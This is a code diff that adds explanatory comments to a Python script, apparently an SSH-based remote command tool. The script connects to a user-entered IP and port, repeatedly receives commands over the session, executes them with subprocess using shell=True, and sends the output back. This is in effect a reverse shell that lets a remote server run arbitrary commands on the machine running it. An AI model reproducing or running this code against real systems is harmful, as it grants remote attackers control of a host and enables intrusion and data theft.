@@ -15,7 +15,8 @@ def ssh_command(ip, port, user, passwd, command):
         print(ssh_session.recv(1024).decode())
 
         while True:
-            command = ssh_session.recv(1024)
+            command = ssh_session.recv(1024) 
+            # takes commands from the connection
             if not command:
                 break
             try:
@@ -23,7 +24,9 @@ def ssh_command(ip, port, user, passwd, command):
                 if cmd == 'exit':
                     break
                 cmd_output = subprocess.check_output(shlex.split(cmd), shell=True)
+                # execute the command 
                 ssh_session.send(cmd_output or b'okay')
+                # send output back to caller
             except Exception as e:
                 ssh_session.send(str(e).encode())
     
@@ -37,5 +40,6 @@ if __name__ == '__main__':
     
     ip = input('Enter server IP: ')
     port = input('Enter port: ')
-    ssh_command(ip, port, user, password, 'ClientConnected')
+    ssh_command(ip, port, user, password, 'ClientConnected') 
+    # First command sent is actually ClientConnected 
 
